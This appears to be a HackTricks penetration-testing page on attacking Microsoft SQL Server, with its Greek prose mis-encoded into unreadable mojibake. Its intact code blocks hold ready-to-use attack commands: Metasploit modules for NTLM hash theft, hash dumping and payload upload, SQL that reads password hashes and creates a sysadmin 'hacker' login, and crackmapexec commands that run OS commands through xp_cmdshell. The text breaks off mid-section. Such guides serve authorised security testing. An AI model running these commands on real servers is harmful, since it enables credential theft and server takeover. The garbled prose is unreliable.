# 1433 - Î•Î»Î­Î³Ï‡Î¿Ï‚ ÎšÎµÎ½ÏÎ½ Î‘ÏƒÏ†Î±Î»ÎµÎ¯Î±Ï‚ MSSQL - Microsoft SQL Server

<details>

<summary><strong>ÎœÎ¬Î¸ÎµÏ„Îµ Ï„Î¿ Ï‡Î¬ÎºÎ¹Î½Î³Îº ÏƒÏ„Î¿ AWS Î±Ï€ÏŒ Ï„Î¿ Î¼Î·Î´Î­Î½ Î¼Î­Ï‡ÏÎ¹ Ï„Î¿Î½ Î®ÏÏ‰Î± Î¼Îµ Ï„Î¿</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (Î•Î¹Î´Î¹ÎºÏŒÏ‚ Î•ÏÏ…Î¸ÏÎ¿Ï Î£Ï…Î½ÎµÏÎ³ÎµÎ¯Î¿Ï… AWS Ï„Î¿Ï… HackTricks)</strong></a><strong>!</strong></summary>

Î†Î»Î»Î¿Î¹ Ï„ÏÏŒÏ€Î¿Î¹ Ï…Ï€Î¿ÏƒÏ„Î®ÏÎ¹Î¾Î·Ï‚ Ï„Î¿Ï… HackTricks:

* Î‘Î½ Î¸Î­Î»ÎµÏ„Îµ Î½Î± Î´ÎµÎ¯Ï„Îµ Ï„Î·Î½ **ÎµÏ„Î±Î¹ÏÎµÎ¯Î± ÏƒÎ±Ï‚ Î´Î¹Î±Ï†Î·Î¼Î¹ÏƒÎ¼Î­Î½Î· ÏƒÏ„Î¿ HackTricks** Î® Î½Î± **ÎºÎ±Ï„ÎµÎ²Î¬ÏƒÎµÏ„Îµ Ï„Î¿ HackTricks ÏƒÎµ Î¼Î¿ÏÏ†Î® PDF** ÎµÎ»Î­Î³Î¾Ï„Îµ Ï„Î± [**Î£Î§Î•Î”Î™Î‘ Î£Î¥ÎÎ”Î¡ÎŸÎœÎ—Î£**](https://github.com/sponsors/carlospolop)!
* Î‘Ï€Î¿ÎºÏ„Î®ÏƒÏ„Îµ Ï„Î¿ [**ÎµÏ€Î¯ÏƒÎ·Î¼Î¿ PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Î‘Î½Î±ÎºÎ±Î»ÏÏˆÏ„Îµ [**Î¤Î·Î½ ÎŸÎ¹ÎºÎ¿Î³Î­Î½ÎµÎ¹Î± PEASS**](https://opensea.io/collection/the-peass-family), Ï„Î· ÏƒÏ…Î»Î»Î¿Î³Î® Î¼Î±Ï‚ Î±Ï€ÏŒ Î±Ï€Î¿ÎºÎ»ÎµÎ¹ÏƒÏ„Î¹ÎºÎ¬ [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Î•Î³Î³ÏÎ±Ï†ÎµÎ¯Ï„Îµ ÏƒÏ„Î·** ğŸ’¬ [**Î¿Î¼Î¬Î´Î± Discord**](https://discord.gg/hRep4RUj7f) Î® ÏƒÏ„Î· [**Î¿Î¼Î¬Î´Î± Ï„Î·Î»ÎµÎ³ÏÎ±Ï†Î®Î¼Î±Ï„Î¿Ï‚**](https://t.me/peass) Î® **Î±ÎºÎ¿Î»Î¿Ï…Î¸Î®ÏƒÏ„Îµ** Î¼Î±Ï‚ ÏƒÏ„Î¿ **Twitter** ğŸ¦ [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **ÎœÎ¿Î¹ÏÎ±ÏƒÏ„ÎµÎ¯Ï„Îµ Ï„Î± Ï‡Î¬ÎºÎ¹Î½Î³Îº ÎºÏŒÎ»Ï€Î± ÏƒÎ±Ï‚ Ï…Ï€Î¿Î²Î¬Î»Î»Î¿Î½Ï„Î±Ï‚ PRs ÏƒÏ„Î±** [**HackTricks**](https://github.com/carlospolop/hacktricks) ÎºÎ±Î¹ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) Î±Ï€Î¿Î¸ÎµÏ„Î®ÏÎ¹Î± Ï„Î¿Ï… github.

</details>

**ÎŸÎ¼Î¬Î´Î± Î‘ÏƒÏ†Î¬Î»ÎµÎ¹Î±Ï‚ Try Hard**

<figure><img src="../../.gitbook/assets/telegram-cloud-document-1-5159108904864449420.jpg" alt=""><figcaption></figcaption></figure>

{% embed url="https://discord.gg/tryhardsecurity" %}

***

## Î’Î±ÏƒÎ¹ÎºÎ­Ï‚ Î Î»Î·ÏÎ¿Ï†Î¿ÏÎ¯ÎµÏ‚

Î‘Ï€ÏŒ Ï„Î·Î½ [wikipedia](https://en.wikipedia.org/wiki/Microsoft\_SQL\_Server):

> **ÎŸ Microsoft SQL Server** ÎµÎ¯Î½Î±Î¹ Î­Î½Î± **ÏƒÏÏƒÏ„Î·Î¼Î± Î´Î¹Î±Ï‡ÎµÎ¯ÏÎ¹ÏƒÎ·Ï‚ ÏƒÏ‡ÎµÏƒÎ¹Î±ÎºÏÎ½ Î²Î¬ÏƒÎµÏ‰Î½ Î´ÎµÎ´Î¿Î¼Î­Î½Ï‰Î½** Ï€Î¿Ï… Î±Î½Î±Ï€Ï„ÏÏ‡Î¸Î·ÎºÎµ Î±Ï€ÏŒ Ï„Î· Microsoft. Î©Ï‚ Î´Î¹Î±ÎºÎ¿Î¼Î¹ÏƒÏ„Î®Ï‚ Î²Î¬ÏƒÎ·Ï‚ Î´ÎµÎ´Î¿Î¼Î­Î½Ï‰Î½, ÎµÎ¯Î½Î±Î¹ Î­Î½Î± Ï€ÏÎ¿ÏŠÏŒÎ½ Î»Î¿Î³Î¹ÏƒÎ¼Î¹ÎºÎ¿Ï Î¼Îµ Ï„Î·Î½ ÎºÏÏÎ¹Î± Î»ÎµÎ¹Ï„Î¿Ï…ÏÎ³Î¯Î± Ï„Î·Î½ Î±Ï€Î¿Î¸Î®ÎºÎµÏ…ÏƒÎ· ÎºÎ±Î¹ Î±Î½Î¬ÎºÏ„Î·ÏƒÎ· Î´ÎµÎ´Î¿Î¼Î­Î½Ï‰Î½ ÏŒÏ€Ï‰Ï‚ Î¶Î·Ï„Î¿ÏÎ½Ï„Î±Î¹ Î±Ï€ÏŒ Î¬Î»Î»ÎµÏ‚ ÎµÏ†Î±ÏÎ¼Î¿Î³Î­Ï‚ Î»Î¿Î³Î¹ÏƒÎ¼Î¹ÎºÎ¿Ï - Î¿Î¹ Î¿Ï€Î¿Î¯ÎµÏ‚ Î¼Ï€Î¿ÏÎµÎ¯ Î½Î± ÎµÎºÏ„ÎµÎ»Î¿ÏÎ½Ï„Î±Î¹ ÎµÎ¯Ï„Îµ ÏƒÏ„Î¿Î½ Î¯Î´Î¹Î¿ Ï…Ï€Î¿Î»Î¿Î³Î¹ÏƒÏ„Î® ÎµÎ¯Ï„Îµ ÏƒÎµ Î¬Î»Î»Î¿ Ï…Ï€Î¿Î»Î¿Î³Î¹ÏƒÏ„Î® Î¼Î­ÏƒÏ‰ Î´Î¹ÎºÏ„ÏÎ¿Ï… (ÏƒÏ…Î¼Ï€ÎµÏÎ¹Î»Î±Î¼Î²Î±Î½Î¿Î¼Î­Î½Î¿Ï… Ï„Î¿Ï… Î”Î¹Î±Î´Î¹ÎºÏ„ÏÎ¿Ï…).\\

**Î ÏÎ¿ÎµÏ€Î¹Î»ÎµÎ³Î¼Î­Î½Î· Î¸ÏÏÎ±:** 1433
```
1433/tcp open  ms-sql-s      Microsoft SQL Server 2017 14.00.1000.00; RTM
```
### **Î ÏÎ¿ÎµÏ€Î¹Î»ÎµÎ³Î¼Î­Î½Î¿Î¹ Ï€Î¯Î½Î±ÎºÎµÏ‚ ÏƒÏ…ÏƒÏ„Î®Î¼Î±Ï„Î¿Ï‚ MS-SQL**

* **Î’Î¬ÏƒÎ· Î´ÎµÎ´Î¿Î¼Î­Î½Ï‰Î½ master**: Î‘Ï…Ï„Î® Î· Î²Î¬ÏƒÎ· Î´ÎµÎ´Î¿Î¼Î­Î½Ï‰Î½ ÎµÎ¯Î½Î±Î¹ ÎºÏÎ¯ÏƒÎ¹Î¼Î· ÎºÎ±Î¸ÏÏ‚ ÎºÎ±Ï„Î±Î³ÏÎ¬Ï†ÎµÎ¹ ÏŒÎ»ÎµÏ‚ Ï„Î¹Ï‚ Î»ÎµÏ€Ï„Î¿Î¼Î­ÏÎµÎ¹ÎµÏ‚ ÏƒÎµ ÎµÏ€Î¯Ï€ÎµÎ´Î¿ ÏƒÏ…ÏƒÏ„Î®Î¼Î±Ï„Î¿Ï‚ Î³Î¹Î± Î¼Î¹Î± Ï€ÎµÏÎ¯Ï€Ï„Ï‰ÏƒÎ· SQL Server.
* **Î’Î¬ÏƒÎ· Î´ÎµÎ´Î¿Î¼Î­Î½Ï‰Î½ msdb**: ÎŸ SQL Server Agent Ï‡ÏÎ·ÏƒÎ¹Î¼Î¿Ï€Î¿Î¹ÎµÎ¯ Î±Ï…Ï„Î®Î½ Ï„Î· Î²Î¬ÏƒÎ· Î´ÎµÎ´Î¿Î¼Î­Î½Ï‰Î½ Î³Î¹Î± Ï„Î· Î´Î¹Î±Ï‡ÎµÎ¯ÏÎ¹ÏƒÎ· Ï„Î¿Ï… Ï€ÏÎ¿Î³ÏÎ±Î¼Î¼Î±Ï„Î¹ÏƒÎ¼Î¿Ï ÎµÎ¹Î´Î¿Ï€Î¿Î¹Î®ÏƒÎµÏ‰Î½ ÎºÎ±Î¹ ÎµÏÎ³Î±ÏƒÎ¹ÏÎ½.
* **Î’Î¬ÏƒÎ· Î´ÎµÎ´Î¿Î¼Î­Î½Ï‰Î½ model**: Î›ÎµÎ¹Ï„Î¿Ï…ÏÎ³ÎµÎ¯ Ï‰Ï‚ ÏƒÏ‡Î­Î´Î¹Î¿ Î³Î¹Î± ÎºÎ¬Î¸Îµ Î½Î­Î± Î²Î¬ÏƒÎ· Î´ÎµÎ´Î¿Î¼Î­Î½Ï‰Î½ ÏƒÏ„Î·Î½ Ï€ÎµÏÎ¯Ï€Ï„Ï‰ÏƒÎ· SQL Server, ÏŒÏ€Î¿Ï… Î¿Ï€Î¿Î¹ÎµÏƒÎ´Î®Ï€Î¿Ï„Îµ Î±Î»Î»Î±Î³Î­Ï‚ ÏŒÏ€Ï‰Ï‚ Î¼Î­Î³ÎµÎ¸Î¿Ï‚, ÏƒÏ…Î»Î»Î¿Î³Î®, Î¼Î¿Î½Ï„Î­Î»Î¿ Î±Î½Î¬ÎºÏ„Î·ÏƒÎ·Ï‚ ÎºÎ±Î¹ Î¬Î»Î»Î± Î±Î½Ï„Î¹ÎºÎ±Ï„Î¿Ï€Ï„ÏÎ¯Î¶Î¿Î½Ï„Î±Î¹ ÏƒÎµ Î½ÎµÎ¿Î´Î·Î¼Î¹Î¿Ï…ÏÎ³Î·Î¼Î­Î½ÎµÏ‚ Î²Î¬ÏƒÎµÎ¹Ï‚ Î´ÎµÎ´Î¿Î¼Î­Î½Ï‰Î½.
* **Î’Î¬ÏƒÎ· Î´ÎµÎ´Î¿Î¼Î­Î½Ï‰Î½ Resource**: ÎœÎ¹Î± Î²Î¬ÏƒÎ· Î´ÎµÎ´Î¿Î¼Î­Î½Ï‰Î½ Î¼ÏŒÎ½Î¿ Î³Î¹Î± Î±Î½Î¬Î³Î½Ï‰ÏƒÎ· Ï€Î¿Ï… Ï†Î¹Î»Î¿Î¾ÎµÎ½ÎµÎ¯ Î±Î½Ï„Î¹ÎºÎµÎ¯Î¼ÎµÎ½Î± ÏƒÏ…ÏƒÏ„Î®Î¼Î±Ï„Î¿Ï‚ Ï€Î¿Ï… ÏƒÏ…Î½Î¿Î´ÎµÏÎ¿Ï…Î½ Ï„Î¿ SQL Server. Î‘Ï…Ï„Î¬ Ï„Î± Î±Î½Ï„Î¹ÎºÎµÎ¯Î¼ÎµÎ½Î±, ÎµÎ½Ï Î±Ï€Î¿Î¸Î·ÎºÎµÏÎ¿Î½Ï„Î±Î¹ Ï†Ï…ÏƒÎ¹ÎºÎ¬ ÏƒÏ„Î· Î²Î¬ÏƒÎ· Î´ÎµÎ´Î¿Î¼Î­Î½Ï‰Î½ Resource, Ï€Î±ÏÎ¿Ï…ÏƒÎ¹Î¬Î¶Î¿Î½Ï„Î±Î¹ Î»Î¿Î³Î¹ÎºÎ¬ ÏƒÏ„Î¿ ÏƒÏ‡Î®Î¼Î± sys ÎºÎ¬Î¸Îµ Î²Î¬ÏƒÎ·Ï‚ Î´ÎµÎ´Î¿Î¼Î­Î½Ï‰Î½.
* **Î’Î¬ÏƒÎ· Î´ÎµÎ´Î¿Î¼Î­Î½Ï‰Î½ tempdb**: Î›ÎµÎ¹Ï„Î¿Ï…ÏÎ³ÎµÎ¯ Ï‰Ï‚ Ï€ÎµÏÎ¹Î¿Ï‡Î® Ï€ÏÎ¿ÏƒÏ‰ÏÎ¹Î½Î®Ï‚ Î±Ï€Î¿Î¸Î®ÎºÎµÏ…ÏƒÎ·Ï‚ Î³Î¹Î± Ï€ÏÎ¿ÏƒÏ‰ÏÎ¹Î½Î¬ Î±Î½Ï„Î¹ÎºÎµÎ¯Î¼ÎµÎ½Î± Î® ÎµÎ½Î´Î¹Î¬Î¼ÎµÏƒÎ± ÏƒÏÎ½Î¿Î»Î± Î±Ï€Î¿Ï„ÎµÎ»ÎµÏƒÎ¼Î¬Ï„Ï‰Î½.

## Î‘Ï€Î±ÏÎ¯Î¸Î¼Î·ÏƒÎ·

### Î‘Ï…Ï„ÏŒÎ¼Î±Ï„Î· Î‘Ï€Î±ÏÎ¯Î¸Î¼Î·ÏƒÎ·

Î‘Î½ Î´ÎµÎ½ Î¾Î­ÏÎµÏ„Îµ Ï„Î¯Ï€Î¿Ï„Î± Î³Î¹Î± Ï„Î·Î½ Ï…Ï€Î·ÏÎµÏƒÎ¯Î±:
```bash
nmap --script ms-sql-info,ms-sql-empty-password,ms-sql-xp-cmdshell,ms-sql-config,ms-sql-ntlm-info,ms-sql-tables,ms-sql-hasdbaccess,ms-sql-dac,ms-sql-dump-hashes --script-args mssql.instance-port=1433,mssql.username=sa,mssql.password=,mssql.instance-name=MSSQLSERVER -sV -p 1433 <IP>
msf> use auxiliary/scanner/mssql/mssql_ping
```
{% hint style="info" %}
Î‘Î½ **Î´ÎµÎ½ Î­Ï‡ÎµÏ„Îµ Î´Î¹Î±Ï€Î¹ÏƒÏ„ÎµÏ…Ï„Î®ÏÎ¹Î±**, Î¼Ï€Î¿ÏÎµÎ¯Ï„Îµ Î½Î± Ï€ÏÎ¿ÏƒÏ€Î±Î¸Î®ÏƒÎµÏ„Îµ Î½Î± Ï„Î± Î¼Î±Î½Ï„Î­ÏˆÎµÏ„Îµ. ÎœÏ€Î¿ÏÎµÎ¯Ï„Îµ Î½Î± Ï‡ÏÎ·ÏƒÎ¹Î¼Î¿Ï€Î¿Î¹Î®ÏƒÎµÏ„Îµ Ï„Î¿ nmap Î® Ï„Î¿ metasploit. ÎÎ± ÎµÎ¯ÏƒÏ„Îµ Ï€ÏÎ¿ÏƒÎµÎºÏ„Î¹ÎºÎ¿Î¯, Î¼Ï€Î¿ÏÎµÎ¯Ï„Îµ Î½Î± **Ï†ÏÎ¬Î¾ÎµÏ„Îµ Î»Î¿Î³Î±ÏÎ¹Î±ÏƒÎ¼Î¿ÏÏ‚** Î±Î½ Î±Ï€Î¿Ï„ÏÏ‡ÎµÏ„Îµ Î½Î± ÏƒÏ…Î½Î´ÎµÎ¸ÎµÎ¯Ï„Îµ Î±ÏÎºÎµÏ„Î­Ï‚ Ï†Î¿ÏÎ­Ï‚ Ï‡ÏÎ·ÏƒÎ¹Î¼Î¿Ï€Î¿Î¹ÏÎ½Ï„Î±Ï‚ Î­Î½Î± Ï…Ï€Î¬ÏÏ‡Î¿Î½ ÏŒÎ½Î¿Î¼Î± Ï‡ÏÎ®ÏƒÏ„Î·.
{% endhint %}

#### Metasploit (Ï‡ÏÎµÎ¹Î¬Î¶ÎµÏ„Î±Î¹ Î´Î¹Î±Ï€Î¹ÏƒÏ„ÎµÏ…Ï„Î®ÏÎ¹Î±)
```bash
#Set USERNAME, RHOSTS and PASSWORD
#Set DOMAIN and USE_WINDOWS_AUTHENT if domain is used

#Steal NTLM
msf> use auxiliary/admin/mssql/mssql_ntlm_stealer #Steal NTLM hash, before executing run Responder

#Info gathering
msf> use admin/mssql/mssql_enum #Security checks
msf> use admin/mssql/mssql_enum_domain_accounts
msf> use admin/mssql/mssql_enum_sql_logins
msf> use auxiliary/admin/mssql/mssql_findandsampledata
msf> use auxiliary/scanner/mssql/mssql_hashdump
msf> use auxiliary/scanner/mssql/mssql_schemadump

#Search for insteresting data
msf> use auxiliary/admin/mssql/mssql_findandsampledata
msf> use auxiliary/admin/mssql/mssql_idf

#Privesc
msf> use exploit/windows/mssql/mssql_linkcrawler
msf> use admin/mssql/mssql_escalate_execute_as #If the user has IMPERSONATION privilege, this will try to escalate
msf> use admin/mssql/mssql_escalate_dbowner #Escalate from db_owner to sysadmin

#Code execution
msf> use admin/mssql/mssql_exec #Execute commands
msf> use exploit/windows/mssql/mssql_payload #Uploads and execute a payload

#Add new admin user from meterpreter session
msf> use windows/manage/mssql_local_auth_bypass
```
### [**Î§Ï…Î´Î±Î¯Î± ÎµÏ€Î¯Î¸ÎµÏƒÎ·**](../../generic-methodologies-and-resources/brute-force.md#sql-server)

### Î§ÎµÎ¹ÏÎ¿ÎºÎ¯Î½Î·Ï„Î· Î‘Ï€Î±ÏÎ¯Î¸Î¼Î·ÏƒÎ·

#### Î£ÏÎ½Î´ÎµÏƒÎ·
```bash
# Using Impacket mssqlclient.py
mssqlclient.py [-db volume] <DOMAIN>/<USERNAME>:<PASSWORD>@<IP>
## Recommended -windows-auth when you are going to use a domain. Use as domain the netBIOS name of the machine
mssqlclient.py [-db volume] -windows-auth <DOMAIN>/<USERNAME>:<PASSWORD>@<IP>

# Using sqsh
sqsh -S <IP> -U <Username> -P <Password> -D <Database>
## In case Windows Auth using "." as domain name for local user
sqsh -S <IP> -U .\\<Username> -P <Password> -D <Database>
## In sqsh you need to use GO after writting the query to send it
1> select 1;
2> go
```
#### ÎšÎ¿Î¹Î½Î® Î‘Ï€Î±ÏÎ¯Î¸Î¼Î·ÏƒÎ·
```sql
# Get version
select @@version;
# Get user
select user_name();
# Get databases
SELECT name FROM master.dbo.sysdatabases;
# Use database
USE master

#Get table names
SELECT * FROM <databaseName>.INFORMATION_SCHEMA.TABLES;
#List Linked Servers
EXEC sp_linkedservers
SELECT * FROM sys.servers;
#List users
select sp.name as login, sp.type_desc as login_type, sl.password_hash, sp.create_date, sp.modify_date, case when sp.is_disabled = 1 then 'Disabled' else 'Enabled' end as status from sys.server_principals sp left join sys.sql_logins sl on sp.principal_id = sl.principal_id where sp.type not in ('G', 'R') order by sp.name;
#Create user with sysadmin privs
CREATE LOGIN hacker WITH PASSWORD = 'P@ssword123!'
EXEC sp_addsrvrolemember 'hacker', 'sysadmin'
```
#### Î›Î®ÏˆÎ· Î§ÏÎ®ÏƒÏ„Î·

{% content-ref url="types-of-mssql-users.md" %}
[types-of-mssql-users.md](types-of-mssql-users.md)
{% endcontent-ref %}
```sql
# Get all the users and roles
select * from sys.database_principals;
## This query filters a bit the results
select name,
create_date,
modify_date,
type_desc as type,
authentication_type_desc as authentication_type,
sid
from sys.database_principals
where type not in ('A', 'R')
order by name;

## Both of these select all the users of the current database (not the server).
## Interesting when you cannot acces the table sys.database_principals
EXEC sp_helpuser
SELECT * FROM sysusers
```
#### Î›Î®ÏˆÎ· Î”Î¹ÎºÎ±Î¹Ï‰Î¼Î¬Ï„Ï‰Î½

1. **Î ÏÎ¿ÏƒÏ„Î±Ï„ÎµÏÏƒÎ¹Î¼Î¿:** ÎŸÏÎ¯Î¶ÎµÏ„Î±Î¹ Ï‰Ï‚ Î¿Î¹ Ï€ÏŒÏÎ¿Î¹ Ï€Î¿Ï… Î´Î¹Î±Ï‡ÎµÎ¹ÏÎ¯Î¶ÎµÏ„Î±Î¹ Î¿ SQL Server Î³Î¹Î± Ï„Î¿Î½ Î­Î»ÎµÎ³Ï‡Î¿ Ï€ÏÏŒÏƒÎ²Î±ÏƒÎ·Ï‚. Î‘Ï…Ï„Î¿Î¯ ÎºÎ±Ï„Î·Î³Î¿ÏÎ¹Î¿Ï€Î¿Î¹Î¿ÏÎ½Ï„Î±Î¹ ÏƒÎµ:
* **Î”Î¹Î±ÎºÎ¿Î¼Î¹ÏƒÏ„Î®Ï‚** â€“ Î Î±ÏÎ±Î´ÎµÎ¯Î³Î¼Î±Ï„Î± Ï€ÎµÏÎ¹Î»Î±Î¼Î²Î¬Î½Î¿Ï…Î½ Î²Î¬ÏƒÎµÎ¹Ï‚ Î´ÎµÎ´Î¿Î¼Î­Î½Ï‰Î½, ÏƒÏ…Î½Î´Î­ÏƒÎµÎ¹Ï‚, Î¿Î¼Î¬Î´ÎµÏ‚ Î´Î¹Î±Î¸ÎµÏƒÎ¹Î¼ÏŒÏ„Î·Ï„Î±Ï‚ ÎºÎ±Î¹ ÏÏŒÎ»Î¿Ï…Ï‚ Î´Î¹Î±ÎºÎ¿Î¼Î¹ÏƒÏ„Î®.
* **Î’Î¬ÏƒÎ· Î”ÎµÎ´Î¿Î¼Î­Î½Ï‰Î½** â€“ Î Î±ÏÎ±Î´ÎµÎ¯Î³Î¼Î±Ï„Î± ÎºÎ±Î»ÏÏ€Ï„Î¿Ï…Î½ ÏÏŒÎ»Î¿Ï…Ï‚ Î²Î¬ÏƒÎ·Ï‚ Î´ÎµÎ´Î¿Î¼Î­Î½Ï‰Î½, ÏÏŒÎ»Î¿Ï…Ï‚ ÎµÏ†Î±ÏÎ¼Î¿Î³Î®Ï‚, ÏƒÏ‡Î®Î¼Î±Ï„Î±, Ï€Î¹ÏƒÏ„Î¿Ï€Î¿Î¹Î·Ï„Î¹ÎºÎ¬, ÎºÎ±Ï„Î±Î»ÏŒÎ³Î¿Ï…Ï‚ Ï€Î»Î®ÏÎ¿Ï…Ï‚ ÎºÎµÎ¹Î¼Î­Î½Î¿Ï… ÎºÎ±Î¹ Ï‡ÏÎ®ÏƒÏ„ÎµÏ‚.
* **Î£Ï‡Î®Î¼Î±** â€“ Î ÎµÏÎ¹Î»Î±Î¼Î²Î¬Î½ÎµÎ¹ Ï€Î¯Î½Î±ÎºÎµÏ‚, Ï€ÏÎ¿Î²Î¿Î»Î­Ï‚, Î´Î¹Î±Î´Î¹ÎºÎ±ÏƒÎ¯ÎµÏ‚, Î»ÎµÎ¹Ï„Î¿Ï…ÏÎ³Î¯ÎµÏ‚, ÏƒÏ…Î½ÏÎ½Ï…Î¼Î±, ÎºÎ»Ï€.
2. **Î”Î¹ÎºÎ±Î¯Ï‰Î¼Î±:** Î£Ï…Î½Î´Î­ÎµÏ„Î±Î¹ Î¼Îµ Ï„Î± Ï€ÏÎ¿ÏƒÏ„Î±Ï„ÎµÏÏƒÎ¹Î¼Î± Ï„Î¿Ï… SQL Server, Î´Î¹ÎºÎ±Î¹ÏÎ¼Î±Ï„Î± ÏŒÏ€Ï‰Ï‚ ALTER, CONTROL ÎºÎ±Î¹ CREATE Î¼Ï€Î¿ÏÎ¿ÏÎ½ Î½Î± Ï‡Î¿ÏÎ·Î³Î·Î¸Î¿ÏÎ½ ÏƒÎµ Î­Î½Î±Î½ Î±ÏÏ‡Î­Ï„Ï…Ï€Î¿. Î— Î´Î¹Î±Ï‡ÎµÎ¯ÏÎ¹ÏƒÎ· Ï„Ï‰Î½ Î´Î¹ÎºÎ±Î¹Ï‰Î¼Î¬Ï„Ï‰Î½ ÏƒÏ…Î¼Î²Î±Î¯Î½ÎµÎ¹ ÏƒÎµ Î´ÏÎ¿ ÎµÏ€Î¯Ï€ÎµÎ´Î±:
* Î£Îµ ÎµÏ€Î¯Ï€ÎµÎ´Î¿ **Î”Î¹Î±ÎºÎ¿Î¼Î¹ÏƒÏ„Î®** Ï‡ÏÎ·ÏƒÎ¹Î¼Î¿Ï€Î¿Î¹ÏÎ½Ï„Î±Ï‚ ÏƒÏ…Î½Î´Î­ÏƒÎµÎ¹Ï‚
* Î£Îµ ÎµÏ€Î¯Ï€ÎµÎ´Î¿ **Î’Î¬ÏƒÎ·Ï‚ Î”ÎµÎ´Î¿Î¼Î­Î½Ï‰Î½** Ï‡ÏÎ·ÏƒÎ¹Î¼Î¿Ï€Î¿Î¹ÏÎ½Ï„Î±Ï‚ Ï‡ÏÎ®ÏƒÏ„ÎµÏ‚
3. **Î‘ÏÏ‡Î­Ï„Ï…Ï€Î¿:** Î‘Ï…Ï„ÏŒÏ‚ Î¿ ÏŒÏÎ¿Ï‚ Î±Î½Î±Ï†Î­ÏÎµÏ„Î±Î¹ ÏƒÏ„Î¿ Î¿Î½Ï„ÏŒÏ„Î·Ï„Î± Ï€Î¿Ï… Î­Ï‡ÎµÎ¹ Ï‡Î¿ÏÎ·Î³Î·Î¸ÎµÎ¯ Î¬Î´ÎµÎ¹Î± Ï€ÏÏŒÏƒÎ²Î±ÏƒÎ·Ï‚ ÏƒÎµ Î­Î½Î± Ï€ÏÎ¿ÏƒÏ„Î±Ï„ÎµÏÏƒÎ¹Î¼Î¿. Î¤Î± Î±ÏÏ‡Î­Ï„Ï…Ï€Î± Ï€ÎµÏÎ¹Î»Î±Î¼Î²Î¬Î½Î¿Ï…Î½ ÎºÏ…ÏÎ¯Ï‰Ï‚ ÏƒÏ…Î½Î´Î­ÏƒÎµÎ¹Ï‚ ÎºÎ±Î¹ Ï‡ÏÎ®ÏƒÏ„ÎµÏ‚ Î²Î¬ÏƒÎ·Ï‚ Î´ÎµÎ´Î¿Î¼Î­Î½Ï‰Î½. ÎŸ Î­Î»ÎµÎ³Ï‡Î¿Ï‚ Ï„Î·Ï‚ Ï€ÏÏŒÏƒÎ²Î±ÏƒÎ·Ï‚ ÏƒÏ„Î± Ï€ÏÎ¿ÏƒÏ„Î±Ï„ÎµÏÏƒÎ¹Î¼Î± Î³Î¯Î½ÎµÏ„Î±Î¹ Î¼Î­ÏƒÏ‰ Ï„Î·Ï‚ Ï‡Î¿ÏÎ®Î³Î·ÏƒÎ·Ï‚ Î® Î±Ï€ÏŒÏÏÎ¹ÏˆÎ·Ï‚ Î´Î¹ÎºÎ±Î¹Ï‰Î¼Î¬Ï„Ï‰Î½ Î® Î¼Îµ Ï„Î· ÏƒÏ…Î¼Ï€ÎµÏÎ¯Î»Î·ÏˆÎ· ÏƒÏ…Î½Î´Î­ÏƒÎµÏ‰Î½ ÎºÎ±Î¹ Ï‡ÏÎ·ÏƒÏ„ÏÎ½ ÏƒÎµ ÏÏŒÎ»Î¿Ï…Ï‚ ÎµÎ¾Î¿Ï€Î»Î¹ÏƒÎ¼Î­Î½Î¿Ï…Ï‚ Î¼Îµ Î´Î¹ÎºÎ±Î¹ÏÎ¼Î±Ï„Î± Ï€ÏÏŒÏƒÎ²Î±ÏƒÎ·Ï‚.
```sql
# Show all different securables names
SELECT distinct class_desc FROM sys.fn_builtin_permissions(DEFAULT);
# Show all possible permissions in MSSQL
SELECT * FROM sys.fn_builtin_permissions(DEFAULT);
# Get all my permissions over securable type SERVER
SELECT * FROM fn_my_permissions(NULL, 'SERVER');
# Get all my permissions over a database
USE <database>
SELECT * FROM fn_my_permissions(NULL, 'DATABASE');
# Get members of the role "sysadmin"
Use master
EXEC sp_helpsrvrolemember 'sysadmin';
# Get if the current user is sysadmin
SELECT IS_SRVROLEMEMBER('sysadmin');
# Get users that can run xp_cmdshell
Use master
EXEC sp_helprotect 'xp_cmdshell'
```
## ÎšÏŒÎ»Ï€Î±

### Î•ÎºÏ„Î­Î»ÎµÏƒÎ· Î•Î½Ï„Î¿Î»ÏÎ½ Î›ÎµÎ¹Ï„Î¿Ï…ÏÎ³Î¹ÎºÎ¿Ï Î£Ï…ÏƒÏ„Î®Î¼Î±Ï„Î¿Ï‚

{% hint style="danger" %}
Î£Î·Î¼ÎµÎ¯Ï‰ÏƒÎ· ÏŒÏ„Î¹ Î³Î¹Î± Î½Î± ÎµÎ¯Î½Î±Î¹ Î´Ï…Î½Î±Ï„Î® Î· ÎµÎºÏ„Î­Î»ÎµÏƒÎ· ÎµÎ½Ï„Î¿Î»ÏÎ½, ÎµÎ¯Î½Î±Î¹ Î±Ï€Î±ÏÎ±Î¯Ï„Î·Ï„Î¿ ÏŒÏ‡Î¹ Î¼ÏŒÎ½Î¿ Î½Î± Î­Ï‡ÎµÏ„Îµ Ï„Î¿ **`xp_cmdshell`** **ÎµÎ½ÎµÏÎ³Î¿Ï€Î¿Î¹Î·Î¼Î­Î½Î¿**, Î±Î»Î»Î¬ ÎµÏ€Î¯ÏƒÎ·Ï‚ Î½Î± Î­Ï‡ÎµÏ„Îµ Ï„Î· **Î¬Î´ÎµÎ¹Î± Î•ÎšÎ¤Î•Î›Î•Î£Î—Î£ ÏƒÏ„Î·Î½ Î±Ï€Î¿Î¸Î·ÎºÎµÏ…Î¼Î­Î½Î· Î´Î¹Î±Î´Î¹ÎºÎ±ÏƒÎ¯Î± `xp_cmdshell`**. ÎœÏ€Î¿ÏÎµÎ¯Ï„Îµ Î½Î± Î´ÎµÎ¯Ï„Îµ Ï€Î¿Î¹Î¿Ï‚ (ÎµÎºÏ„ÏŒÏ‚ Î±Ï€ÏŒ Ï„Î¿Ï…Ï‚ sysadmins) Î¼Ï€Î¿ÏÎµÎ¯ Î½Î± Ï‡ÏÎ·ÏƒÎ¹Î¼Î¿Ï€Î¿Î¹Î®ÏƒÎµÎ¹ Ï„Î¿ **`xp_cmdshell`** Î¼Îµ:
```sql
Use master
EXEC sp_helprotect 'xp_cmdshell'
```
{% endhint %}
```bash
# Username + Password + CMD command
crackmapexec mssql -d <Domain name> -u <username> -p <password> -x "whoami"
# Username + Hash + PS command
crackmapexec mssql -d <Domain name> -u <username> -H <HASH> -X '$PSVersionTable'

# Check if xp_cmdshell is enabled
SELECT * FROM sys.configurations WHERE name = 'xp_cmdshell';

# This turns on advanced options and is needed to configure xp_cmdshell
